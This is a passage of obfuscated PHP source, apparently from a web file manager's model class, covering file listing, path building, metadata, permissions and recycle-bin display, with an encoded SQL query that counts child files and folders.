$d„†¿å’‹[401] => $d„†¿å’‹[375], $d„†¿å’‹[183] => $d„†¿å’‹[183], $d„†¿å’‹[106] => $d„†¿å’‹[106]); $Dä“åÃ©Ú = Input::get($d„†¿å’‹[402], $d„†¿å’‹[7], $dÒÒ“çÓÚ¦, array_keys($FŞ®ë¦Â)); goto FªÍ§¶²; Bë°×«ŒğÓ: if ($Dä“åÃ©Ú == $d„†¿å’‹[28]) { } $Bğ±ÁáĞ£¢ = $d„†¿å’‹[404] . $FŞ®ë¦Â[$Dä“åÃ©Ú] . $d„†¿å’‹[50] . $dš´¤Šİ”±[$F„Ë—ÒºÜà]; return $this->order(rtrim(trim($Bğ±ÁáĞ£¢), $d„†¿å’‹[47])); goto Fª ï£°çä; eùîÊÑ‘‹˜: $d„†¿å’‹ =& $_SERVER[Ìó]; $dÒÒ“çÓÚ¦ = Model($d„†¿å’‹[394])->get($d„†¿å’‹[395]); $AÈŒÎâĞÌ = Model($d„†¿å’‹[394])->get($d„†¿å’‹[396]); goto eÊ¯æë†ƒÑ; FªÍ§¶²: $F„Ë—ÒºÜà = Input::get($d„†¿å’‹[403], $d„†¿å’‹[7], $AÈŒÎâĞÌ, array_keys($dš´¤Šİ”±)); if (!in_array($Dä“åÃ©Ú, array_keys($FŞ®ë¦Â))) { $Dä“åÃ©Ú = $d„†¿å’‹[28]; } if (!in_array($F„Ë—ÒºÜà, array_keys($dš´¤Šİ”±))) { $Dä“åÃ©Ú = $d„†¿å’‹[397]; } goto Bë°×«ŒğÓ; Fª ï£°çä: } protected function _listDataApplyItem($F¥³ŒÅŠ¡Õ, $c¦–¥‡ğè = false) { $c­ÍÍÜ‹Ã¹ = array($F¥³ŒÅŠ¡Õ); $this->_listDataApply($c­ÍÍÜ‹Ã¹, $c¦–¥‡ğè); return $c­ÍÍÜ‹Ã¹[0]; } protected function _listDataApply(&$e‘ÄÙ »ù¡, $A•¥²’š•é = false) { goto cè©ÂãÌ¹ˆ; cè©ÂãÌ¹ˆ: $bÜ¼ÕËğ =& $_SERVER[Ìó]; if (!$e‘ÄÙ »ù¡) { $e‘ÄÙ »ù¡ = array(); return; } $E¥Ç˜êœôç = array_to_keyvalue($e‘ÄÙ »ù¡, $bÜ¼ÕËğ[33], $bÜ¼ÕËğ[365]); goto BßÎñÍÄï ; fÏ¼îöÒ: $this->_listAppendUser($e‘ÄÙ »ù¡); $this->_listFilterInfo($e‘ÄÙ »ù¡, $A•¥²’š•é); goto E•¬æÏÇ¢; CƒÄğÓ˜»˜: $this->_listAppendPath($e‘ÄÙ »ù¡); $this->_listAppendAuth($e‘ÄÙ »ù¡); $this->_listAppendSourceInfo($e‘ÄÙ »ù¡, $E¥Ç˜êœôç); goto fÏ¼îöÒ; BßÎñÍÄï : $E¥Ç˜êœôç = array_unique($E¥Ç˜êœôç); $this->_listSourceCache($e‘ÄÙ »ù¡); if (!$A•¥²’š•é) { $this->_listAppendMeta($e‘ÄÙ »ù¡, $E¥Ç˜êœôç); $this->_listAppendFileMeta($e‘ÄÙ »ù¡, $E¥Ç˜êœôç); $this->_listAppendChildren($e‘ÄÙ »ù¡, $E¥Ç˜êœôç); } goto CƒÄğÓ˜»˜; E•¬æÏÇ¢: } protected function _listSourceCache($D¯¦ÖŠÙ¼”) { $D£ò‡§çÁ =& $_SERVER[Ìó]; foreach ($D¯¦ÖŠÙ¼” as $B½™Ú””·) { self::$cacheSourceInfo[$D£ò‡§çÁ[405] . $B½™Ú””·[$D£ò‡§çÁ[365]]] = $B½™Ú””·; } } protected function _listFilterInfo(&$Cˆ¹‰Šª”ï, $FÇ¿¦Ô»— = false) { $D À°øã· =& $_SERVER[Ìó]; foreach ($Cˆ¹‰Šª”ï as &$AåÛ´µá¯¡) { $AåÛ´µá¯¡ = $this->pathInfoFilter($AåÛ´µá¯¡); self::$cachePathInfo[$D À°øã·[406] . intval($FÇ¿¦Ô»—) . $D À°øã·[407] . $AåÛ´µá¯¡[$D À°øã·[365]]] = $AåÛ´µá¯¡; } } protected function _listMake(&$A¬ë£ö¥Ãå) { $cêá½“ã¢´ =& $_SERVER[Ìó]; $A¬ë£ö¥Ãå[$cêá½“ã¢´[74]] = array(); $A¬ë£ö¥Ãå[$cêá½“ã¢´[73]] = array(); foreach ($A¬ë£ö¥Ãå[$cêá½“ã¢´[350]] as $Bêè âÀ»İ) { $D‡²®Š®”  = $Bêè âÀ»İ[$cêá½“ã¢´[366]] == 1 ? $cêá½“ã¢´[74] : $cêá½“ã¢´[73]; $A¬ë£ö¥Ãå[$D‡²®Š®” ][] = $Bêè âÀ»İ; } unset($A¬ë£ö¥Ãå[$cêá½“ã¢´[350]]); } protected function _listAppendMeta(&$aÛÉÍ¼š¹—, $fÙ‡ŒÍø–ğ) { goto E³‹‹Àš’; A“…ñ±ïïè: if (!$fÕ°íİÌ¦) { return; } $B‘íæ¾¦³ = array($E¦²’¯£[410], $E¦²’¯£[411]); $cŞøì×é§® = array(); goto b¸ÙÏš Ü†; b¸ÙÏš Ü†: foreach ($fÕ°íİÌ¦ as $Fªù¥´¦­š) { if (!isset($cŞøì×é§®[$Fªù¥´¦­š[$E¦²’¯£[365]]])) { $cŞøì×é§®[$Fªù¥´¦­š[$E¦²’¯£[365]]] = array(); } if (in_array($Fªù¥´¦­š[$E¦²’¯£[89]], $B‘íæ¾¦³)) { continue; } $cŞøì×é§®[$Fªù¥´¦­š[$E¦²’¯£[365]]][$Fªù¥´¦­š[$E¦²’¯£[89]]] = $Fªù¥´¦­š[$E¦²’¯£[355]]; } foreach ($aÛÉÍ¼š¹— as &$fÎ¢ÙÁçÖÅ) { $fÎ¢ÙÁçÖÅ[$E¦²’¯£[412]] = !1; if (isset($cŞøì×é§®[$fÎ¢ÙÁçÖÅ[$E¦²’¯£[365]]])) { $fÎ¢ÙÁçÖÅ[$E¦²’¯£[412]] = $cŞøì×é§®[$fÎ¢ÙÁçÖÅ[$E¦²’¯£[365]]]; } if ($this->fileIsLock($fÎ¢ÙÁçÖÅ) && $fÎ¢ÙÁçÖÅ[$E¦²’¯£[372]]) { $CöçåºªÂ¼ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $fÎ¢ÙÁçÖÅ[$E¦²’¯£[372]][$E¦²’¯£[373]] = AuthModel::authDisable($fÎ¢ÙÁçÖÅ[$E¦²’¯£[372]][$E¦²’¯£[373]], $CöçåºªÂ¼); $fÎ¢ÙÁçÖÅ[$E¦²’¯£[372]][$E¦²’¯£[413]][$E¦²’¯£[372]] = $fÎ¢ÙÁçÖÅ[$E¦²’¯£[372]][$E¦²’¯£[373]]; } } goto fÌ—Ÿ®ªš–; E³‹‹Àš’: $E¦²’¯£ =& $_SERVER[Ìó]; $D»÷ç‰Ø = array($E¦²’¯£[379] => array($E¦²’¯£[380], $fÙ‡ŒÍø–ğ)); $fÕ°íİÌ¦ = Model($E¦²’¯£[408])->field($E¦²’¯£[409])->where($D»÷ç‰Ø)->select(); goto A“…ñ±ïïè; fÌ—Ÿ®ªš–: } protected function _listAppendFileMeta(&$Cˆšáµ¼ó¤, $FÚãùéÓÏ¥) { goto AÊöîñ„íŒ; cœ¶Ù·Ğôª: $Cİó˜ŠÖâ = $Cİó˜ŠÖâ ? $Cİó˜ŠÖâ : array(); $fšĞ³â‡” = array(); foreach ($Cİó˜ŠÖâ as $EÈîÖ•Ã) { if (!isset($fšĞ³â‡”[$EÈîÖ•Ã[$eÆÒ§‘Êç[414]]])) { $fšĞ³â‡”[$EÈîÖ•Ã[$eÆÒ§‘Êç[414]]] = array(); } $fšĞ³â‡”[$EÈîÖ•Ã[$eÆÒ§‘Êç[414]]][$EÈîÖ•Ã[$eÆÒ§‘Êç[89]]] = $EÈîÖ•Ã[$eÆÒ§‘Êç[355]]; } goto AÁãÃŒåğö; AÊöîñ„íŒ: $eÆÒ§‘Êç =& $_SERVER[Ìó]; $cŒ¯±í„„ = array_to_keyvalue($Cˆšáµ¼ó¤, $eÆÒ§‘Êç[33], $eÆÒ§‘Êç[414]); $cŒ¯±í„„ = array_filter(array_unique($cŒ¯±í„„)); goto f‘…ö†ô”¦; AÁãÃŒåğö: foreach ($Cˆšáµ¼ó¤ as &$E«§áÄÒ‰¾) { goto AŒäÀ½­”Á; C´óé÷Ä: unset($eØ©ß‘ìÛÙ[$Fİ˜¢äéƒ][$eÆÒ§‘Êç[75]]); $BÎñÂÍÔº = is_array($fšĞ³â‡”[$Fİ˜¢äéƒ]) ? $fšĞ³â‡”[$Fİ˜¢äéƒ] : array(); $E«§áÄÒ‰¾[$eÆÒ§‘Êç[158]] = array_merge($BÎñÂÍÔº, $eØ©ß‘ìÛÙ[$Fİ˜¢äéƒ]); goto aŒ‘ÎÎ†Å; aŒ‘ÎÎ†Å: if (isset($E«§áÄÒ‰¾[$eÆÒ§‘Êç[158]][$eÆÒ§‘Êç[421]])) { $E«§áÄÒ‰¾[$eÆÒ§‘Êç[421]] = json_decode($E«§áÄÒ‰¾[$eÆÒ§‘Êç[158]][$eÆÒ§‘Êç[421]], !0); unset($E«§áÄÒ‰¾[$eÆÒ§‘Êç[158]][$eÆÒ§‘Êç[421]]); } goto c²ï‘ù µŸ; AŒäÀ½­”Á: $Fİ˜¢äéƒ = $E«§áÄÒ‰¾[$eÆÒ§‘Êç[414]]; if (!$Fİ˜¢äéƒ || !isset($eØ©ß‘ìÛÙ[$Fİ˜¢äéƒ])) { continue; } $e‚ğÌÓäà‘ = $eØ©ß‘ìÛÙ[$Fİ˜¢äéƒ]; goto AÃ—…æÌ¥·; AÃ—…æÌ¥·: $e‚ğÌÓäà‘[$eÆÒ§‘Êç[77]] = $E«§áÄÒ‰¾[$eÆÒ§‘Êç[77]]; $e‚ğÌÓäà‘[$eÆÒ§‘Êç[28]] = $E«§áÄÒ‰¾[$eÆÒ§‘Êç[28]]; self::$cacheFileInfo[$eÆÒ§‘Êç[420] . $Fİ˜¢äéƒ] = $e‚ğÌÓäà‘; goto C´óé÷Ä; c²ï‘ù µŸ: } goto a¥±ÌªÒšŒ; f‘…ö†ô”¦: if (!$cŒ¯±í„„) { return; } $F‰¹Š‰¹¢ = array($eÆÒ§‘Êç[415] => array($eÆÒ§‘Êç[380], $cŒ¯±í„„)); $f¼¨™«ºöù = $eÆÒ§‘Êç[416]; goto d±·¶Ğ¢Â; d±·¶Ğ¢Â: $eØ©ß‘ìÛÙ = Model($eÆÒ§‘Êç[417])->field($f¼¨™«ºöù)->where($F‰¹Š‰¹¢)->select(); $eØ©ß‘ìÛÙ = array_to_keyvalue($eØ©ß‘ìÛÙ, $eÆÒ§‘Êç[414]); $Cİó˜ŠÖâ = Model($eÆÒ§‘Êç[418])->field($eÆÒ§‘Êç[419])->where($F‰¹Š‰¹¢)->select(); goto cœ¶Ù·Ğôª; a¥±ÌªÒšŒ: } protected function _listAppendSourceInfo(&$a‰Úì¼…İ, $Dğ¡´‡ºŠ°) { goto BîÁ»×­ÙÔ; B…¾ìğ“Î: $E…â¼›«ŠÇ = Model($aÄÙ‰Ç¯¡ó[388])->listData(); $dàµˆõ“†¡ = Model($aÄÙ‰Ç¯¡ó[377])->listData(); $CŒâæš  = Model($aÄÙ‰Ç¯¡ó[424])->listSimple(); goto C‚æ—¸·‡µ; BîÁ»×­ÙÔ: $aÄÙ‰Ç¯¡ó =& $_SERVER[Ìó]; if (!defined($aÄÙ‰Ç¯¡ó[422])) { return; } $d°“«Ôˆ³ = Model($aÄÙ‰Ç¯¡ó[423])->listData(); goto B…¾ìğ“Î; C‚æ—¸·‡µ: $CÔˆ°™¹„ = array_to_keyvalue($d°“«Ôˆ³, $aÄÙ‰Ç¯¡ó[363]); $DÓˆœÓõ± = array_to_keyvalue_group($E…â¼›«ŠÇ, $aÄÙ‰Ç¯¡ó[75], $aÄÙ‰Ç¯¡ó[389]); $c–Ïê·çñ± = array_to_keyvalue($dàµˆõ“†¡, $aÄÙ‰Ç¯¡ó[75]); goto e“Ø«ñ†à; e“Ø«ñ†à: $DÕµÄ¹» = array_to_keyvalue_group($CŒâæš , $aÄÙ‰Ç¯¡ó[365]); foreach ($a‰Úì¼…İ as &$E‹…İäáŒø) { $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]] = array($aÄÙ‰Ç¯¡ó[425] => 0, $aÄÙ‰Ç¯¡ó[426] => 0, $aÄÙ‰Ç¯¡ó[427] => 0); if (isset($c–Ïê·çñ±[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]])) { $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[428]] = 1; $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[429]] = $c–Ïê·çñ±[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]][$aÄÙ‰Ç¯¡ó[28]]; } if (isset($DÓˆœÓõ±[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]])) { $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[430]] = array(); foreach ($DÓˆœÓõ±[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]] as $föÀ’ŒŸ•) { $a¸æ¥êÇ‰ƒ = $CÔˆ°™¹„[$föÀ’ŒŸ•]; $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[430]][] = array($aÄÙ‰Ç¯¡ó[431] => $a¸æ¥êÇ‰ƒ[$aÄÙ‰Ç¯¡ó[363]], $aÄÙ‰Ç¯¡ó[382] => $a¸æ¥êÇ‰ƒ[$aÄÙ‰Ç¯¡ó[28]], $aÄÙ‰Ç¯¡ó[432] => $a¸æ¥êÇ‰ƒ[$aÄÙ‰Ç¯¡ó[433]]); } } if (isset($DÕµÄ¹»[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]])) { $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[434]] = array(); foreach ($DÕµÄ¹»[$E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[365]]] as $B˜»Ä”ğß«) { $E‹…İäáŒø[$aÄÙ‰Ç¯¡ó[387]][$aÄÙ‰Ç¯¡ó[434]] = array($aÄÙ‰Ç¯¡ó[435] => $B˜»Ä”ğß«[$aÄÙ‰Ç¯¡ó[436]], $aÄÙ‰Ç¯¡ó[437] => $B˜»Ä”ğß«[$aÄÙ‰Ç¯¡ó[438]], $aÄÙ‰Ç¯¡ó[439] => $B˜»Ä”ğß«[$aÄÙ‰Ç¯¡ó[365]], $aÄÙ‰Ç¯¡ó[440] => $B˜»Ä”ğß«[$aÄÙ‰Ç¯¡ó[441]], $aÄÙ‰Ç¯¡ó[442] => $B˜»Ä”ğß«[$aÄÙ‰Ç¯¡ó[443]]); } } } return $a‰Úì¼…İ; goto CÌƒùÔ¸‚; CÌƒùÔ¸‚: } protected function _listAppendChildren(&$D»‚Öœ§Ğ“, $A²¹¢ÅÒ) { goto A®ƒ›§¬ÒŸ; A®ƒ›§¬ÒŸ: $C¬Õô‰‹Ú” =& $_SERVER[Ìó]; $Cæá¸Š†¨š = $C¬Õô‰‹Ú”[357]; $D¹¶½ã«¼é = array(); goto DëˆÖªØµË; DëˆÖªØµË: $eƒòÅ¥¬éÇ = 1024 * 50; $D»‚Öœ§Ğ“ = is_array($D»‚Öœ§Ğ“) ? $D»‚Öœ§Ğ“ : array(); $A¥Š©ÒŸ = count($D»‚Öœ§Ğ“); goto få¬íğºˆ•; få¬íğºˆ•: $b¾°à†åë¾ = $this->tablePrefix . $this->tableName; for ($cõŒøÎÜ£¡ = 0; $cõŒøÎÜ£¡ < $A¥Š©ÒŸ; $cõŒøÎÜ£¡++) { $Câ«‰íëˆ = intval($D»‚Öœ§Ğ“[$cõŒøÎÜ£¡][$C¬Õô‰‹Ú”[392]]); if ($D»‚Öœ§Ğ“[$cõŒøÎÜ£¡][$C¬Õô‰‹Ú”[366]]) { $eæ”§—Ÿ“ = $D»‚Öœ§Ğ“[$cõŒøÎÜ£¡][$C¬Õô‰‹Ú”[365]]; $Cæá¸Š†¨š .= "\x53\105\x4c\x45\103\124\x20\x2a\x20\x46\x52\x4f\115\x20\x28\123\105\x4c\x45\x43\124\40\47{$eæ”§—Ÿ“}\137\x68\x61\163\x46\x69\x6c\x65\47\40\141\163\x20\x68\x61\x73\x2c\143\x6f\x75\x6e\x74\50\x31\51\40\141\x73\x20\150\141\163\103\157\165\156\x74\x20\x46\x52\117\x4d\40\140{$b¾°à†åë¾}\x60\x20\12\11\x9\x9\x9\11\x77\x68\145\x72\x65\x20\x70\x61\162\145\x6e\164\111\104\75{$eæ”§—Ÿ“}\40\141\x6e\144\x20\x69\x73\x46\x6f\154\144\x65\x72\75\60\40\141\156\x64\40\x69\x73\104\x65\154\x65\164\145\75{$Câ«‰íëˆ}\x29\40\x61\163\x20\x74\142\x31\x5f{$eæ”§—Ÿ“}\x20\165\156\x69\157\x6e\x20\141\154\154\x20\xa\11\x9\x9\x9\11\x53\105\114\105\x43\124\x20\x2a\x20\x46\x52\117\x4d\40\50\123\x45\x4c\105\103\124\40\x27{$eæ”§—Ÿ“}\137\x68\x61\163\106\157\154\144\x65\162\x27\x20\141\x73\x20\150\141\x73\106\x69\x6c\x65\54\x63\x6f\x75\156\164\50\x31\x29\x20\141\163\40\x68\x61\163\103\157\x75\156\x74\x20\106\x52\117\x4d\x20\140{$b¾°à†åë¾}\140\40\xa\11\x9\x9\11\11\x77\x68\x65\x72\145\40\x70\141\x72\145\156\164\x49\x44\75{$eæ”§—Ÿ“}\40\141\x6e\x64\40\151\x73\106\157\x6c\x64\x65\162\x3d\61\40\141\156\x64\40\151\163\x44\x65\x6c\145\x74\145\x3d{$Câ«‰íëˆ}\x29\x20\x61\x73\x20\164\x62\x32\x5f{$eæ”§—Ÿ“}\x20\x75\156\151\x6f\156\x20\x61\x6c\x6c\x20"; } if ((strlen($Cæá¸Š†¨š) >= $eƒòÅ¥¬éÇ || $cõŒøÎÜ£¡ == $A¥Š©ÒŸ - 1) && $Cæá¸Š†¨š) { $Cæá¸Š†¨š = substr($Cæá¸Š†¨š, 0, -strlen($C¬Õô‰‹Ú”[444])); $AÁìôåÏ÷ö = $this->query($Cæá¸Š†¨š); $D¹¶½ã«¼é = array_merge($D¹¶½ã«¼é, $AÁìôåÏ÷ö); $Cæá¸Š†¨š = $C¬Õô‰‹Ú”[33]; } } $D¹¶½ã«¼é = array_to_keyvalue($D¹¶½ã«¼é, $C¬Õô‰‹Ú”[445]); goto e¼á½Ç‘ğ; e¼á½Ç‘ğ: foreach ($D»‚Öœ§Ğ“ as &$AçÖµšİÏ¶) { if ($AçÖµšİÏ¶[$C¬Õô‰‹Ú”[366]]) { unset($AçÖµšİÏ¶[$C¬Õô‰‹Ú”[368]]); $AçÖµšİÏ¶[$C¬Õô‰‹Ú”[188]] = intval($D¹¶½ã«¼é[$AçÖµšİÏ¶[$C¬Õô‰‹Ú”[365]] . $C¬Õô‰‹Ú”[446]][$C¬Õô‰‹Ú”[447]]); $AçÖµšİÏ¶[$C¬Õô‰‹Ú”[187]] = intval($D¹¶½ã«¼é[$AçÖµšİÏ¶[$C¬Õô‰‹Ú”[365]] . $C¬Õô‰‹Ú”[448]][$C¬Õô‰‹Ú”[447]]); } } goto FĞìö‰ã¤; FĞìö‰ã¤: } protected function _listAppendAuth(&$B³‚ªâÅ‡) { goto B„°»Òùí; c›”•š‘µ¸: foreach ($B³‚ªâÅ‡ as $Fˆ±˜¨®ï¦) { if ($Fˆ±˜¨®ï¦[$a³«Îöè´Ù[367]] == self::TYPE_GROUP) { $bĞšø®Û™¸[] = $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[365]]; } } if (!$bĞšø®Û™¸) { return; } $CŞß¬‚×²‡ = array_to_keyvalue($B³‚ªâÅ‡, $a³«Îöè´Ù[365]); goto BÕÀÅÊ·ö¯; B„°»Òùí: $a³«Îöè´Ù =& $_SERVER[Ìó]; if (!defined($a³«Îöè´Ù[422])) { return; } $bĞšø®Û™¸ = array(); goto c›”•š‘µ¸; BÕÀÅÊ·ö¯: $F¸Œ­§Ûàõ = Model($a³«Îöè´Ù[449])->getSourceList($bĞšø®Û™¸, $CŞß¬‚×²‡); foreach ($B³‚ªâÅ‡ as $Cìä¾öÔ—™ => &$Fˆ±˜¨®ï¦) { $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]] = $F¸Œ­§Ûàõ[$Fˆ±˜¨®ï¦[$a³«Îöè´Ù[365]]]; if (!$Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]] && $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[367]] == self::TYPE_GROUP) { $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]] = Action($a³«Îöè´Ù[450])->pathGroupAuthMake($Fˆ±˜¨®ï¦[$a³«Îöè´Ù[451]]); if (!$Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]] && !_get($GLOBALS, $a³«Îöè´Ù[452])) { $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[185]] = !1; $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[184]] = !1; } } if ($Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]]) { $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[185]] = AuthModel::authCheckEdit($Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]][$a³«Îöè´Ù[373]]); $Fˆ±˜¨®ï¦[$a³«Îöè´Ù[184]] = AuthModel::authCheckView($Fˆ±˜¨®ï¦[$a³«Îöè´Ù[372]][$a³«Îöè´Ù[373]]); } $this->groupPathDisplay($Fˆ±˜¨®ï¦); } goto CõÇ÷ƒÆÒ; CõÇ÷ƒÆÒ: } public function groupPathDisplay(&$d²¶“’¹ôŠ) { goto dÒ™•¦¸ŞÖ; dÒ™•¦¸ŞÖ: $BÓ…ÑÖ®³ä =& $_SERVER[Ìó]; if ($d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[367]] != self::TYPE_GROUP) { return; } $FŸ‡Úƒ´®§ = Model($BÓ…ÑÖ®³ä[453])->getInfo($d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[451]]); goto A‡¸Ú‹˜Ëã; A‡¸Ú‹˜Ëã: $f§¢³Àƒ×Ã = $this->parentLevelArray($FŸ‡Úƒ´®§[$BÓ…ÑÖ®³ä[454]]); $Eºí¤Ê¶Ò¿ = $BÓ…ÑÖ®³ä[33]; foreach ($f§¢³Àƒ×Ã as $d·äãŒ¼Á) { $BÒ«’½œº… = Model($BÓ…ÑÖ®³ä[453])->getInfo($d·äãŒ¼Á); $Eºí¤Ê¶Ò¿ .= $BÒ«’½œº…[$BÓ…ÑÖ®³ä[387]][$BÓ…ÑÖ®³ä[365]] . $BÓ…ÑÖ®³ä[47]; } goto EÍÜ¡Ìª¨µ; dÔ¯£ÙÉ³: $d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[459]] = $Eºí¤Ê¶Ò¿ . $FŸ‡Úƒ´®§[$BÓ…ÑÖ®³ä[387]][$BÓ…ÑÖ®³ä[365]]; goto D´ØßöêÏ; EÍÜ¡Ìª¨µ: $d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[455]] = $FŸ‡Úƒ´®§[$BÓ…ÑÖ®³ä[456]]; $d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[376]] = $FŸ‡Úƒ´®§[$BÓ…ÑÖ®³ä[454]]; $d²¶“’¹ôŠ[$BÓ…ÑÖ®³ä[457]] = $FŸ‡Úƒ´®§[$BÓ…ÑÖ®³ä[458]]; goto dÔ¯£ÙÉ³; D´ØßöêÏ: } protected function _listAppendPath(&$DŒ¼ç‡›ì‹) { goto aö¹ÕùÁ‰; aö¹ÕùÁ‰: $f¦…ÕšÂ„Ô =& $_SERVER[Ìó]; $F«˜ øÊÇ = array(); foreach ($DŒ¼ç‡›ì‹ as &$Eï¥Ÿå‹İ™) { $F«˜ øÊÇ[$Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[365]]] = $Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[28]]; $aÙ¿˜Ùå¨œ = $this->parentLevelArray($Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[454]]); array_shift($aÙ¿˜Ùå¨œ); foreach ($aÙ¿˜Ùå¨œ as $A«Æ ÑÚ‚À) { if (!isset($F«˜ øÊÇ[$A«Æ ÑÚ‚À])) { $F«˜ øÊÇ[$A«Æ ÑÚ‚À] = 0; } } } goto C¡£ãç©•à; a¦åéÙ™‡‹: $AªĞÌŒòª  = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($DŒ¼ç‡›ì‹ as &$Eï¥Ÿå‹İ™) { goto b…ÁºìŸô; b…ÁºìŸô: $aÙ¿˜Ùå¨œ = $this->parentLevelArray($Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[454]]); $BÆÌ»òµª“ = $this->_listAppendPathRoot($Eï¥Ÿå‹İ™, $aÙ¿˜Ùå¨œ); foreach ($aÙ¿˜Ùå¨œ as $A«Æ ÑÚ‚À) { if (isset($F«˜ øÊÇ[$A«Æ ÑÚ‚À])) { $BÆÌ»òµª“ .= $F«˜ øÊÇ[$A«Æ ÑÚ‚À] . $f¦…ÕšÂ„Ô[8]; } } goto d‰ŠÓ‚š»; dËàÓ…¨ñ‰: $Aë¹‰ãÃšˆ = trim($Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[461]], $f¦…ÕšÂ„Ô[8]); if ($Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[456]] == $f¦…ÕšÂ„Ô[463] && $Aë¹‰ãÃšˆ) { $Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[28]] = $Aë¹‰ãÃšˆ; } $this->_listAppendPathRecycle($Eï¥Ÿå‹İ™, $aÙ¿˜Ùå¨œ, $AªĞÌŒòª ); goto a¦÷…·ßâ°; d‰ŠÓ‚š»: if ($aÙ¿˜Ùå¨œ) { $BÆÌ»òµª“ .= $Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[28]]; } if ($Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[366]]) { $BÆÌ»òµª“ .= $f¦…ÕšÂ„Ô[8]; } $Eï¥Ÿå‹İ™[$f¦…ÕšÂ„Ô[461]] = str_replace($f¦…ÕšÂ„Ô[462], $f¦…ÕšÂ„Ô[8], $BÆÌ»òµª“); goto dËàÓ…¨ñ‰; a¦÷…·ßâ°: } goto c·×…Â–§; C¡£ãç©•à: $e¢Óà…¤–ì = array(); foreach ($F«˜ øÊÇ as $E–§ºìó¡¤ => $FùÊ¦æëÕ) { if (!$FùÊ¦æëÕ) { $e¢Óà…¤–ì[] = $E–§ºìó¡¤; } } if ($e¢Óà…¤–ì) { $DËÓ­‹›ó = array($f¦…ÕšÂ„Ô[379] => array($f¦…ÕšÂ„Ô[380], $e¢Óà…¤–ì)); if (count($e¢Óà…¤–ì) == 1) { $Cà¬Ëõ„Š = $this->sourceInfo($e¢Óà…¤–ì[0]); $Cà¬Ëõ„Š = is_array($Cà¬Ëõ„Š) ? array($Cà¬Ëõ„Š) : !1; } else { $Cà¬Ëõ„Š = $this->field($f¦…ÕšÂ„Ô[460])->where($DËÓ­‹›ó)->select(); } $BÃø‚¶È¼‹ = array_to_keyvalue($Cà¬Ëõ„Š, $f¦…ÕšÂ„Ô[365], $f¦…ÕšÂ„Ô[28]); $F«˜ øÊÇ = array_merge_index($F«˜ øÊÇ, $BÃø‚¶È¼‹); } goto a¦åéÙ™‡‹; c·×…Â–§: } private function _listAppendPathRecycle(&$Aİª§Ì¢¸‘, $F¿Şˆ‘µß, $D¶‰èä£Œ÷) { goto E¢ÀÚ‰µ¹; eÃã˜•³…»: $FœŠ¼àŞ = explode($fĞ“ÉŒ—ó„[8], trim($Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[461]], $fĞ“ÉŒ—ó„[8])); $B×ÌÄîˆª® = implode($fĞ“ÉŒ—ó„[8], array_slice($FœŠ¼àŞ, 2)); $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[461]] = $fĞ“ÉŒ—ó„[8] . LNG($fĞ“ÉŒ—ó„[464]) . $fĞ“ÉŒ—ó„[8] . ltrim($B×ÌÄîˆª®, $fĞ“ÉŒ—ó„[8]); goto B·«É™†·²; B·«É™†·²: $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[454]] = $fĞ“ÉŒ—ó„[465] . implode($fĞ“ÉŒ—ó„[47], array_slice($F¿Şˆ‘µß, 1)) . $fĞ“ÉŒ—ó„[47]; if ($Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[365]] == $D¶‰èä£Œ÷) { $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[454]] = $fĞ“ÉŒ—ó„[465]; $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[456]] = $fĞ“ÉŒ—ó„[463]; $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[28]] = LNG($fĞ“ÉŒ—ó„[464]); } $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[466]] = $fĞ“ÉŒ—ó„[467]; goto B­½Ë¿¯”; E¢ÀÚ‰µ¹: $fĞ“ÉŒ—ó„ =& $_SERVER[Ìó]; if (intval($Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($D¶‰èä£Œ÷, $F¿Şˆ‘µß) && $Aİª§Ì¢¸‘[$fĞ“ÉŒ—ó„[365]] != $D¶‰èä£Œ÷) { return; 